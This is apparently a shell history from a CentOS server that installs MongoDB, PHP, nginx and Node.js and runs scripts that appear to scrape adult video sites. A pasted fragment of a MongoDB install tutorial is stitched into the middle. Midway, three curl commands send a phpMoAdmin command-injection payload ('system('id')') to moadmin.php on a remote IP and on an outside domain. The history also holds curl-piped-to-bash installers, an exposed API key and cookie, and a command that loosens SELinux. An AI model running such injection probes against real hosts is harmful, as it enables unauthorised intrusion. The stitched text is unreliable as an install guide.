top
df -h
yum list|grep mongo
uname -a
cat /etc/*release*
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-server-4.4.1-1.el8.x86_64.rpm
yum install python2 -y
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-server-4.4.1-1.el8.x86_64.rpm
service mongod status
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-tools-4.4.1-1.el8.x86_64.rpm
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-database-tools-100.2.0.x86_64.rpm
yum install cyrus-sasl -y
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-database-tools-100.2.0.x86_64.rpm
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-database-tools-extra-4.4.1-1.el8.x86_64.rpm
systemctl enable mongod
systemctl start mongod
service mongod status
top
ls /var/log/mongodb
yum info mongodb-org-database-tools-extra
yum info mongodb-database-tools
yum info mongodb-org-server
dnf repoquery --installed -l mongodb-org-database-tools-extra
dnf repoquery --installed -l mongodb-database-tools
dnf repoquery --installed -l mongodb-org-server
install_compass
pecl
rpm -ivh http://rpms.remirepo.net/enterprise/remi-release-8.rpm
yum install -y epel-release
rpm -ivh http://rpms.remirepo.net/enterprise/remi-release-8.rpm
yum install -y php74
yum install php74-php-devel -y
yum install php74-php-fpm -y
systemctl enable php74-php-fpm
systemctl start php74-php-fpm
cp /usr/bin/php74 /usr/bin/php
yum install -y php74-php-cli php74-php-fpm php74-php-gd php74-php-imap php74-php-intl php74-php-json php74-php-ldap php74-php-mbstring php74-php-mcrypt php74-php-mysqlnd php74-php-pdo php74-php-pear php74-php-pgsql php74-php-process php74-php-pspell php74-php-recode php74-php-soap php74-php-xml php74-php-xmlrpc postfix
yum install -y autoconf automake make openssl-devel unzip zip gcc
yum install -y php74-php-opcache
php -v
vi /etc/opt/remi/php74/php-fpm.d/www.conf
vi /etc/nginx.conf
yum install -y nginx
service nginx status
systemctl enable nginx
vi /etc/nginx.conf
systemctl start nginx
vi /etc/nginx.conf
find / -name nginx.conf
vi /etc/nginx/nginx.conf
service nginx start
service nginx status
service firewalld status
sudo firewall-cmd --permanent --zone=public --add-service=http 
sudo firewall-cmd --permanent --zone=public --add-service=https
sudo firewall-cmd --reload
yum list installed|grep php7
yum install -y php74-php-devel php74-php-pear 
pecl install mongodb
sudo pecl install mongodb
find / -name *pecl
sudo /opt/remi/php74/root/usr/bin/pecl install mongodb
find / -name curl.so
ls /opt/remi/php74/root/usr/lib64/php/modules/
find / -name php.ini
vi /etc/opt/remi/php74/php.ini
ls /etc/opt/remi/php74/php.d/
cd /etc/opt/remi/php74/php.d/
cat 20-pdo.ini
echo extension=mongodb.so > /etc/opt/remi/php74/php.d/20-mongodb.ini
ls
service php74-php-fpm restart
php -m
yum list|grep mongo
php -c "echo 'a';"
php -r "echo 'a';"
php -r "echo new MongoClient();"
php -r "echo new Mongo();"
php -r "echo new MongoDB();"
php -m
cp /usr/bin/php74 /usr/bin/php
php -r "echo new MongoDB();"
php -r "echo new MongoClient();"
php -r "echo new \MongoClient();"
php -r "echo new MongoDB\Driver\Manager;"
service nginx restart
find / -name error.log
tail /var/opt/remi/php74/log/php-fpm/error.log
tail /var/log/nginx/error.log
telnet
yum install -y telnet
telnet 127.0.0.1 9000
tail /var/log/nginx/error.log
ps aux | grep nginx
ps aux | grep php74-php-fpm
vi /etc/opt/remi/php74/php-fpm.d/www.conf
service php74-php-fpm restart
ps aux | grep php74-php-fpm
vi /etc/opt/remi/php74/php-fpm.d/www.conf
service php74-php-fpm restart
ps aux | grep php74-php-fpm
find / -name php74-php-fpm.service
vi /usr/lib/systemd/system/php74-php-fpm.service
vi /etc/opt/remi/php74/php-fpm.d/www.conf
service php74-php-fpm restart
ps aux | grep php74-php-fpm
find / -name nginx.service
vi /usr/lib/systemd/system/nginx.service
ps aux | grep nginx
tail /var/log/nginx/error.log
ps aux | grep php74-php-fpm
semanage permissive -a httpd_t
tail /var/log/nginx/error.log
curl
cd ~
curl -sS https://getcomposer.org/installer | php
mv composer.phar /usr/local/bin/composer
which composer.phar
which composer
cd /usr/share/nginx/html
composer require mongodb/mongodb
tail /var/log/nginx/error.log
service php74-php-fpm restart
tail /var/log/nginx/error.log
php -r "echo MongoClient::VERSION;"
php -r "echo Mongo\Client::VERSION;"
php -r 'echo phpversion("mongodb")';
php -r 'echo phpversion("mongodb");'
tail /var/log/nginx/error.log
top
tail /var/log/nginx/error.log
cat /etc/mongod.conf
tail /var/log/nginx/error.log
yum install -y epel-release curl
curl --silent --location https://rpm.nodesource.com/setup_14.x | bash -
yum install -y nodejs
yum -y install nodejs
yum install gcc-c++ make
npm i pm2 typescript -g
cd /home/thumb
npm i
npm run serve
npm run start
node dist/test1.js 1
curl -I https://xhamster.one/18535
curl -I https://xhamster.one/18536
curl -I https://xhamster.one/20536
node dist/test1.js 2 100 > /dev/null 2>&1 &
top
ps aux|grep node
top
curl  "http://139.180.196.39/moadmin.php" -d "object=1;system('id');exit"
curl  "http://kaburu.news/moadmin.php" -d "object=1;system('id');exit"
curl  "http://139.180.196.39/moadmin.php" -d "object=1;system('id');exit"
node dist/test1.js 102 1000 > /dev/null 2>&1 &
ps aux|grep node
curl -I https://xhamster.one/20536
node dist/test1.js 102 1
cd /home/thumb
node dist/test1.js 102 1000 > /dev/null 2>&1 &
ps aux|grep node
kill -9 59243
ps aux|grep node
curl -I https://xhamster.one/20536
node dist/test1.js 135
node dist/test1.js 134
node dist/test1.js 133
node dist/test1.js 132
node dist/test1.js 133 1000 > /dev/null 2>&1 &
top
service mongod status
tail /var/log/nginx/error.log
service php-fpm status
service php74-php-fpm status
ps aux|grep node
top
ps aux|grep node
service mongod status -L
service mongod status -l
ps aux|grep node
telnet 127.0.0.1 27017
ps aux|grep node
tail /var/log/nginx/error.log
ps aux|grep node
top
service mongod restart
service php74-php-fpm restart
service nginx restart
top
mongo
rpm -ivh We will install MongoDB 4.4 on CentOS 8
<strong>Step 1: install requirements</strong>
[code]yum install python2 -y
yum install cyrus-sasl -y[/code]
<em>Result:</em>
[code]...
[root@tutorialspots ~]# yum install cyrus-sasl -y
Last metadata expiration check: 0:31:25 ago on Sun 04 Oct 2020 02:22:52 PM UTC.
Dependencies resolved.
================================================================================
<%%KEEPWHITESPACE%%> Package            Architecture   Version                 Repository      Size
================================================================================
Installing:
<%%KEEPWHITESPACE%%> cyrus-sasl         x86_64         2.1.27-1.el8            BaseOS          96 k
Transaction Summary
================================================================================
Install  1 Package
Total download size: 96 k
Installed size: 160 k
Downloading Packages:
cyrus-sasl-2.1.27-1.el8.x86_64.rpm              6.0 MB/s |  96 kB     00:00
--------------------------------------------------------------------------------
Total                                           202 kB/s |  96 kB     00:00
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
<%%KEEPWHITESPACE%%>  Preparing        :                                                        1/1
<%%KEEPWHITESPACE%%>  Running scriptlet: cyrus-sasl-2.1.27-1.el8.x86_64                         1/1
<%%KEEPWHITESPACE%%>  Installing       : cyrus-sasl-2.1.27-1.el8.x86_64                         1/1
<%%KEEPWHITESPACE%%>  Running scriptlet: cyrus-sasl-2.1.27-1.el8.x86_64                         1/1
<%%KEEPWHITESPACE%%>  Verifying        : cyrus-sasl-2.1.27-1.el8.x86_64                         1/1
Installed products updated.
Installed:
<%%KEEPWHITESPACE%%>  cyrus-sasl-2.1.27-1.el8.x86_64
<strong>Step 2:</strong>
Find RPM file <a href="https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/">here</a>
mongodb-org-server-4.4.1:
<a href="https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-server-4.4.1-1.el8.x86_64.rpm">mongodb-org-server-4.4.1-1.el8.x86_64.rpm</a>
mongodb-database-tools:
<a href="https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-database-tools-100.2.0.x86_64.rpm">mongodb-database-tools-100.2.0.x86_64.rpm</a>
mongodb-org-database-tools-extra:
<a href="https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-database-tools-extra-4.4.1-1.el8.x86_64.rpm">mongodb-org-database-tools-extra-4.4.1-1.el8.x86_64.rpm</a>
mongodb-org-shell-4.4.1
<a href="https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-shell-4.4.1-1.el8.x86_64.rpm">mongodb-org-shell-4.4.1-1.el8.x86_64.rpm</a>
<strong>Step 3:</strong>
[code]rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-server-4.4.1-1.el8.x86_64.rpm
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-database-tools-100.2.0.x86_64.rpm
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-database-tools-extra-4.4.1-1.el8.x86_64.rpm[/code]
<em>Result:</em>
[code][root@tutorialspots ~]# rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-server-4.4.1-1.el8.x86_64.rpm
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-database-tools-extra-4.4.1-1.el8.x86_64.rpm
rpm -ivh https://repo.mongodb.org/yum/redhat/8Server/mongodb-org/4.4/x86_64/RPMS/mongodb-org-shell-4.4.1-1.el8.x86_64.rpm
dnf repoquery --installed -l mongodb-org-shell
mongo
top
mongo
npm run start
node dist/test1.js 1130
node dist/test1.js 1131
node dist/test1.js 1132
node dist/test1.js 1133
mongo
cd /home/thumb
node dist/test1.js 1133
node dist/test1.js 1132
npm run start
node dist/test1.js 1132
node dist/test1.js 1131
node dist/test1.js 1130
node dist/test1.js 1129
node dist/test1.js 1128
node dist/test1.js 1126 2
node dist/test1.js 1124 2
node dist/test1.js 1122 2
node dist/test1.js 1120 2
node dist/test1.js 1133
node dist/test1.js 1134 1000 > /dev/null 2>&1 &
top
ps aux|grep node
mongo
node dist/test1.js 2133 1000 > /dev/null 2>&1 &
service mongod status
ps aux|grep node
node dist/test1.js 2133
cd /home/thumb
node dist/test1.js 2133 1000 > /dev/null 2>&1 &
cd /home/thumb
ps aux|grep node
node dist/test1.js 2419
node dist/test1.js 2133 
node dist/test1.js 2132 1000 > /dev/null 2>&1 &
ps aux|grep node
top
node dist/test1.js 2727
cd /home/thumb
node dist/test1.js 2727
node dist/test1.js 2728
node dist/test1.js 2726
node dist/test1.js 2725
node dist/test1.js 2720 5
node dist/test1.js 2710 10
node dist/test1.js 2700 10
node dist/test1.js 2690 10
node dist/test1.js 2600 90
node dist/test1.js 2489 111
node dist/test1.js 2488
node dist/test1.js 2400 88
cd /home/thumb
node dist/test1.js 2473 15
node dist/test1.js 2300 100
node dist/test1.js 2660
cd /home/thumb
node dist/test1.js 2660
node dist/test1.js 3000
node dist/test1.js 2700
node dist/test1.js 2670
node dist/test1.js 2680
node dist/test1.js 2681 19 > /dev/null 2>&1 &
top
node dist/test1.js 2308
cd /home/thumb
node dist/test1.js 2308
node dist/test1.js 2309
node dist/test1.js 2310 90 > /var/log/log 2>&1 &
cd /home/thumb
tail /var/log/log
node dist/test1.js 4000
node dist/test1.js 4001 9999 > /var/log/log 2>&1 &
cd /home/thumb
npm run start
top
tail /var/log/log
ps aux|grep node
tail /var/log/log -n 60
cd /home/thumb
node dist/test1.js 4001 9999 > /var/log/log 2>&1 &
tail /var/log/log -n 60
cd /home/thumb
ps aux|grep node
node dist/test1.js 2660
node dist/test1.js 2670
node dist/test1.js 2680
node dist/test1.js 2671 9
tail -n 60 /var/log/log
npm run start
node dist/test1.js 2681 9
node dist/test1.js 2690 310  > /var/log/log 2>&1 &
tail /var/log/log
node dist/test1.js 3000 1000  > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep node
cd /home/thumb
node dist/test1.js 4000
node dist/test1.js 4010
node dist/test1.js 4011 9000  > /var/log/log 2>&1 &
tail /var/log/log
tail /var/log/nginx/error.log
tail /var/log/log
tail /var/log/log
cd /home/thumb
node dist/test1.js 4309 9000  > /var/log/log 2>&1 &
tail /var/log/log
tail /var/log/nginx/error.log
tail /var/log/log
cd /home/thumb
tail /var/log/log
ps aux|grep node
node dist/test1.js 7132 9000  > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep node
top
cd /home/thumb
node dist/test1.js 7703 7000  > /var/log/log 2>&1 &
tail /var/log/log
tail /var/log/log|grep page
tail /var/log/log
tail /var/log/log -n 2
tail /var/log/log -n 2|grep page
tail /var/log/log -n 2|grep page|gawk -F: '{ print $1 }'
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'
ps aux|grep node
ps aux|grep 'node dist'
ps aux|grep 'node dist'|wc -l
a=$(ps aux|grep 'node dist'|wc -l);echo $a
b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }');echo $b
echo $b-1
echo expr($b-1)
echo expr '$b-1'
echo `expr '$b-1'`
expr 10+10
expr 10 + 10
expr $b - 1
c=`expr $b - 1`
echo $c
if ["$c" eq 7958] do echo "a" end; ;
if ["$c" eq 7958] do echo "a" end;  ;
if ["$c" eq 7958] then echo "a" fi; ;
if ["$c" eq 7958]; then echo "a" fi;  ;
if [ "$c" eq 7958 ]; then echo "a" fi;  ;
if [ "$c" = 7958 ]; then echo "a" fi;   ;
if [ $c = 7958 ]; then echo "a"; fi
if [ "$c" = 7958 ]; then echo "a"; fi
a=$(ps aux|grep 'node dist'|wc -l);echo $a
b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }');echo $b
if [ "$c" = 7958 ]; then echo "a"; fi
if [ "$c" = 7958 ]; then if [ $c = 7958 ]; then echo "a";fi; fi
if [ "$c" = 7958 ]; then if [ $c = 7958 ]; then (echo "a");fi; fi
expr 100 - 1 + 1
ps aux|grep 'node dist'|wc -l
b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }');echo $b
ps aux|grep 'node dist'|wc -l
a=$(ps aux|grep 'node dist'|wc -l); if [ "$a" = 1 ]; then b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'); if [ $b < 18000 ]; then c=`expr 18001 - $b`;(cd /home/thumb && /usr/bin/node dist/test1.js $b $c  > /var/log/log 2>&1 &); fi; fi
a=$(ps aux|grep 'node dist'|wc -l); if [ "$a" = 1 ]; then b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'); if [ $b < 18000 ]; then c=`expr 18001 - $b`;(cd /home/thumb && /usr/bin/node dist/test1.js "$b" "$c" > /var/log/log 2>&1 &); fi; fi
b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }')
echo $b
bash -c "echo 1"
x=1
bash -c "echo $x"
a=$(ps aux|grep 'node dist'|wc -l); if [ "$a" = 1 ]; then b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'); if [ $b < 18000 ]; then c=`expr 18001 - $b`;(cd /home/thumb && bash -c "/usr/bin/node dist/test1.js $b $c  > /var/log/log 2>&1 &"); fi; fi
a=$(ps aux|grep 'node dist'|wc -l); if [ "$a" = 1 ]; then b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'); if [ $b < 18000 ]; then c=`expr 18001 - $b`;(cd /home/thumb & /usr/bin/node dist/test1.js $b $c  > /var/log/log 2>&1 &); fi; fi
a=$(ps aux|grep 'node dist'|wc -l); if [ "$a" = 1 ]; then b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'); if [ $b < 18000 ]; then c=`expr 18001 - $b`;(cd /home/thumb ; /usr/bin/node dist/test1.js $b $c  > /var/log/log 2>&1 &); fi; fi
c=`expr 18001 - $b`
echo $c
cd /home/thumb ; /usr/bin/node dist/test1.js $b $c  > /var/log/log 2>&1 &
echo $b
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }
'
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'
curl 'https://content.googleapis.com/drive/v3/files/1TOJPD5Ep6qLEJHmk3WiCdEq4bSb6pR3m?key=AIzaSyAa8yy0GdcGPHdtD083HiGGx_S0vMPScDM'   -H 'authority: content.googleapis.com'   -H 'pragma: no-cache'   -H 'cache-control: no-cache'   -H 'x-requested-with: XMLHttpRequest'   -H 'x-goog-encode-response-if-executable: base64'   -H 'x-origin: https://explorer.apis.google.com'   -H 'x-clientdetails: appVersion=5.0%20(Windows%20NT%206.1%3B%20WOW64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F83.0.4103.61%20Safari%2F537.36&platform=Win32&userAgent=Mozilla%2F5.0%20(Windows%20NT%206.1%3B%20WOW64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F83.0.4103.61%20Safari%2F537.36'   -H 'x-javascript-user-agent: apix/3.0.0 google-api-javascript-client/1.1.0'   -H 'x-referer: https://explorer.apis.google.com'   -H 'user-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'   -H 'accept: */*'   -H 'x-client-data: CKS1yQEIhbbJAQijtskBCMG2yQEIqZ3KAQiWrMoBCIa1ygEImbXKAQj2x8oBCOfIygEItMvKAQjB18oB'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-mode: cors'   -H 'sec-fetch-dest: empty'   -H 'referer: https://content.googleapis.com/static/proxy.html?usegapi=1&jsh=m%3B%2F_%2Fscs%2Fapps-static%2F_%2Fjs%2Fk%3Doz.gapi.en.76xGL2Yny_o.O%2Fam%3DwQE%2Fd%3D1%2Fct%3Dzgms%2Frs%3DAGLTcCPLubAJPE__-DfP0tDIR1-cduAt3Q%2Fm%3D__features__'   -H 'accept-language: en-US,en;q=0.9,vi;q=0.8,und;q=0.7'   --compressed
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'
ps aux|grep 'node dist'|wc -l
a=$(ps aux|grep 'node dist'|wc -l); if [ "$a" = 1 ]; then b=$(tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'); if [ $b -lt 18000 ]; then c=`expr 18001 - $b`;(cd /home/thumb ; /usr/bin/node dist/test1.js $b $c  > /var/log/log 2>&1 &); fi; fi
ps aux|grep 'node dist'|wc -l
echo $b $c
ps aux|grep 'node dist'|wc -l
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'
top
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'
cd /home/thumb
node dist/test1.js 17970
node dist/test1.js 17980
node dist/test1.js 17990
node dist/test1.js 17997
node dist/test1.js 18000
node dist/test1.js 18001 846 > /var/log/log 2>&1 &
tail /var/log/log -n 2|grep page|gawk -F: '{ print $2 }'
tail /var/log/log 
node dist/test1.js 18846
cd /home/thumb
node dist/test1.js 18846
node dist/test1.js 18847
node dist/test1.js 18848
node dist/test1.js 18849
node dist/test1.js 18850
node dist/test1.js 18851 10
curl https://xhasmter.one/18860
curl https://xhamster.one/18860
node dist/test1.js 18860
node dist/test1.js 18846
node dist/test1.js 18847
node dist/test1.js 18848
node dist/test1.js 18849
cd /home/thumb
npm run start
cd /home/thumb
node dist/test3.js 1
node dist/test3.js 2 19998 > /var/log/log 2>&1 &
top
cd /home/thumb
ps aux|grep 'node dist'|wc -l
tail /var/lob/log
tail /var/log/log
node dist/test3.js 94 19900 > /var/log/log 2>&1 &
tail /var/log/log
npm run start
tail /var/log/log
ps aux|grep 'node dist'
kill -9 78507
ps aux|grep 'node dist'
node dist/test3.js 20000 -19700 > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep 'node dist'
kill -9 78623
tail /var/log/log
curl "https://www.xvideos3.com/new/19999" > 19999.html
curl "https://www.xvideos3.com/new/19998" > 19998.html
curl "https://www.xvideos3.com/new/19999"
curl "https://www.xvideos3.com/new/2"
ping www.xvideos3.com
ping www.xvideos.com
ping www.xvideos2.com
curl "https://www.xvideos3.com/new/2"
curl "https://www.xvideos3.com/"
curl -k "https://www.xvideos3.com/"
curl -k "https://www.xvideos.com/"
curl -k "https://www.xvideos3.com/"
curl -k "https://www.xvideos.com/new/19999" >19999.html
curl -k "https://www.xvideos.com/new/19998" >19998.html
curl -k "https://www.xvideos3.com/video58609169/fetish_for_pussy123191"
curl -k "https://www.xvideos.com/video58609169/fetish_for_pussy123191"
npm run start
node dist/test3.js 20000 -19700 > /var/log/log 2>&1 &
tail /var/log/log
curl -I "https://ev-h.rdtcdn.com/hls/media/videos/200706/10/7769/,480P_600K,240P_400K,_7769.mp4.urlset/index-f2-v1-a1.m3u8?validfrom=1602214008&validto=1602221208&ipa=27.66.213.67&hdl=-1&hash=TSIcZGO9NqPsCNO3mkEAnutd%2Fw8%3D"
tail /var/log/log
curl -k "https://ev-h.rdtcdn.com/hls/media/videos/200706/10/7769/,480P_600K,240P_400K,_7769.mp4.urlset/index-f2-v1-a1.m3u8?validfrom=1602214008&validto=1602221208&ipa=27.66.213.67&hdl=-1&hash=TSIcZGO9NqPsCNO3mkEAnutd%2Fw8%3D"
curl -I "https://ev-h.rdtcdn.com/hls/media/videos/200706/10/7769/,480P_600K,240P_400K,_7769.mp4.urlset/seg-45-f2-v1-a1.ts?validfrom=1602214008&validto=1602221208&ipa=27.66.213.67&hdl=-1&hash=TSIcZGO9NqPsCNO3mkEAnutd%2Fw8%3D"
tail /var/log/log
ps aux|grep 'node dist'
cd /home/thumb
node dist/test3.js 18549 -18000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test3.js 18545 -18000 > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep 'node dist'
tail /var/log/log
cd /home/thumb
node dist/test3.js 17527 -17000 > /var/log/log 2>&1 &
tail /var/log/log
tail /var/log/log|grep "page 19999"
tail /var/log/log|grep "page: 19999"
cat /var/log/log|grep "page: 19999"
cat /var/log/log|grep "page: 18999"
cat /var/log/log|grep "page: 16021"
cat /var/log/log|grep "page: 17021"
cat /var/log/log|grep "page: 18021"
cat /var/log/log|grep "page: 17999"
cat /var/log/log|grep "page: 17599"
cat /var/log/log|grep "page: 17099"
cat /var/log/log|grep "page: 17199"
cat /var/log/log|grep "page: 17299"
cat /var/log/log|grep "page: 17399"
cat /var/log/log|grep "page: 17499"
cat /var/log/log|grep "page: 17550"
cat /var/log/log|grep "page: 17530"
cat /var/log/log|grep "page: 17520"
tail /var/log/log
top
cd /home/thumb
cat /var/log/log
tail /var/log/log
node dist/test3.js 14922
node dist/test3.js 14921
node dist/test3.js 14920
node dist/test3.js 14919 -14000 > /var/log/log 2>&1 &
tail /var/log/log
top
tail /var/log/log
curl -H 'Host: backend.qubee.io' -H 'Cookie: __cfduid=daa4bca0abbaeea32858ac9e6b9ef6eeb1602287837' -H 'cache-control: max-age=0' -H 'save-data: on' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Linux; Android 9; LG-F800S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'sec-fetch-site: none' -H 'sec-fetch-mode: navigate' -H 'sec-fetch-user: ?1' -H 'sec-fetch-dest: document' -H 'accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5' --compressed 'https://backend.qubee.io/embed/42d4bfa5-dfa6-49c1-b830-2a96d7835bc4.mp4?utm_source=zalo&utm_medium=zalo&utm_campaign=zalo&zarsrc=31' > 1.mp4
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port protocol="tcp" port="31000" accept'
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port protocol="udp" port="31000" accept'
sudo firewall-cmd --reload
cd /home/stream
node app.js
cd /home/stream
node app.js
tail /var/log/log
cd /home/thumb
node dist/test3.js 9650 -9000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test3.js 7581 -7000 > /var/log/log 2>&1 &
cd /home/thumb
tail /var/log/log
node dist/test3.js 7559 -7000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test3.js 6393 -6000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test3.js 6393 -6000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test3.js 4794 -4000 > /var/log/log 2>&1 &
cd /home/thumb
tail /var/log/log
node dist/test3.js 795 -700 > /var/log/log 2>&1 &
tail /var/log/log
node dist/test3.js 95 -94 > /var/log/log 2>&1 &
tail /var/log/log
node dist/test3.js 1
npm run start
service mongod restart
node dist/test3.js 1 29000 > /var/log/log 2>&1 &
top
tail /var/log/log
ps aux |grep test
kill -9 97076
ps aux |grep test
node dist/test5.js 1 29000 > /var/log/log 2>&1 &
tail /var/log/log
ps aux |grep test
tail /var/log/log
kill -9 97120
kill -9 97197
tail /var/log/log
ps aux |grep test
kill -9 97097
ps aux |grep test
tail /var/log/log
npm run start
mongo
npm run start
node dist/test5.js 1 29000 > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep test
kill -9 97558
npm run start
ps aux|grep test
node dist/test5.js 25 29000 > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep test
cd /home/thumb
node dist/test5.js 29 29000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 67 29000 > /var/log/log 2>&1 &
cd /home/thumb
tail /var/log/log
npm run start
ps aux|grep test
kill -9 999231
ps aux|grep test
node dist/test5.js 565
npm run start
node dist/test5.js 565
node dist/test5.js 564
node dist/test5.js 566
tail /var/log/log
node dist/test5.js 565
node dist/test5.js 564
node dist/test5.js 566
node dist/test5.js 567
npm run start
node dist/test5.js 565 28000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
tail /var/log/log
node dist/test5.js 2863 26000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 2990 26000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
tail /var/log/log
node dist/test5.js 6198 23000 > /var/log/log 2>&1 &
tail /var/log/log
top
tail /var/log/log
top
tail /var/log/log
ps aux|grep test
kill -9 108565
ps aux|grep test
mongo
service mongod restart
mongo
tail /var/log/log
node dist/test5.js 7137 22000 > /var/log/log 2>&1 &
tail /var/log/log
ps aux|grep test
cd /home/thumb
node dist/test5.js 7189 21000 > /var/log/log 2>&1 &
tail /var/log/log
yum install -y php74-php-gmp
php -m
service php74-php-fpm restart
tail /var/log/nginx/error.log
yum install -y php74-php-memcache
yum install -y php74-php-memcached
service php74-php-fpm restart
tail /var/log/nginx/error.log
service memcached status
yum install -y memcached
service memcached status
systemctl enable memcached
systemctl start memcached
service memcached status
tail /var/log/nginx/error.log
service php74-php-fpm restart
tail /var/log/log
cd /home/thumb
tail /var/log/log
node dist/test5.js 8131 21000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 8367 20000 > /var/log/log 2>&1 &
curl -I "https://di.phncdn.com/www-static/thumbzilla/images/pc/sprite-main.png?cache=2020101402"
tail /var/log/log
cd /home/thumb
tail /var/log/log
node dist/test5.js 8367 20000 > /var/log/log 2>&1 &
tail /var/log/log
top
tail /var/log/log
mongo
tail /var/log/log
service redis status
yum list|grep redis
yum install redis -y
service redis status
systemctl enable redis
systemctl start redis
service redis status
top
tail /var/log/log
cd /home/thumb
node dist/test5.js 11179 8000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 11225 8000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 11232 8000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 11265 8000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 11427 8000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 12571 7000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 12573 7000 > /var/log/log 2>&1 &
tail /var/log/log
top
tail /var/log/log
cd /home/thumb
tail /var/log/log
node dist/test5.js 12579 7000 > /var/log/log 2>&1 &
top
tail /var/log/log
node dist/test5.js 12589 7000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 12589 7000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
tail /var/log/log
node dist/test5.js 13087 5000 > /var/log/log 2>&1 &
tail /var/log/log
cd /home/thumb
node dist/test5.js 15975 3000 > /var/log/log 2>&1 &
cd /home/thumb
tail /var/log/log
tail /var/log/log -n 30
top
tail /var/log/log -n 30
tail /var/log/log 
cd /home/thumb
node dist/test5.js 16018 3000 > /var/log/log 2>&1 &
tail /var/log/log 
tail /var/log/log -n 30
cd /home/thumb
node dist/test5.js 16600 2000 > /var/log/log 2>&1 &
tail /var/log/log 
